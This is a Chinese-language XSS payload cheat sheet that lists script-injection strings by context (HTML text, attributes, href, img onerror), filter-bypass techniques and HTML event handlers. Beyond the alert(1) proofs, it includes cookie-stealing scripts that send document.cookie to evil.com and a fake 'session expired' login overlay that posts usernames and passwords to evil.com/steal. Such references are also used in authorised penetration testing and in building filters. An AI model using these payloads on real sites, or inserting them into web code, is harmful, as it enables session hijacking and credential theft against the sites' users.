# XSS Payload 速查表

## 按注入上下文分类

### HTML文本内容

```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### HTML属性值

```html
" onclick=alert(1)
" onfocus=alert(1) autofocus
" onmouseover=alert(1)
' onclick=alert(1)
```

### a 标签 href 属性

```html
javascript:alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
```

### img 标签（无需交互）

```html
<img src=x onerror=alert(1)>
<img src=1 onerror=alert(1)>
<img/src=x/onerror=alert(1)>
```

### Cookie 窃取

```html
<script>document.location='http://evil.com/?c='+document.cookie</script>
<script>new Image().src='http://evil.com/?c='+document.cookie</script>
```

### XSS钓鱼

```html
<script>
document.body.innerHTML = '<div style="position:fixed;top:30%;left:40%;background:white;padding:20px;border:1px solid #ccc;"><h3>会话已过期，请重新登录</h3><form action="http://evil.com/steal"><input name="user"><input name="pass" type="password"><input type="submit"></form></div>';
</script>
```

## 绕过手法速查

| 场景 | Payload |
|------|---------|
| `on` 被过滤 | `Onclick` / `ONCLICK` / `<a href="javascript:...">` |
| `script` 被过滤 | `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)` |
| `<>` 被编码 | 用属性闭合: `" onclick=alert(1)` |
| 空格被过滤 | `/` 替代: `<img/src=x/onerror=alert(1)>` 或 `%0a` / `%0d` |
| 长度限制 | 短域名跳转: `<script src=//t.cn/xxx>` |
| `javascript:` 被过滤 | HTML实体编码 `href` 值 |

## HTML事件属性速查

| 事件 | 触发条件 | 示例 |
|------|----------|------|
| onerror | 资源加载失败 | `<img src=x onerror=alert(1)>` |
| onload | 元素加载完成 | `<body onload=alert(1)>` |
| onclick | 点击元素 | `<div onclick=alert(1)>click</div>` |
| onfocus | 获得焦点 | `<input onfocus=alert(1) autofocus>` |
| onmouseover | 鼠标悬停 | `<div onmouseover=alert(1)>hover</div>` |
| oninput | 输入内容 | `<input oninput=alert(1) autofocus>` |
